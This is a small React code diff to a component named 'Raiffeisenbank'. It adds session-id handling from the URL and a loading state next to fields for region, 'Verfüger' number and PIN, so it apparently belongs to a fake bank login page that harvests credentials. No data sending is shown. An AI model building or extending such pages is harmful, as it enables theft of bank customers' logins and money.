@@ -54,6 +54,11 @@ const translations = {
 };
 
 const Raiffeisenbank = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [bundesland, setBundesland] = useState("");
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
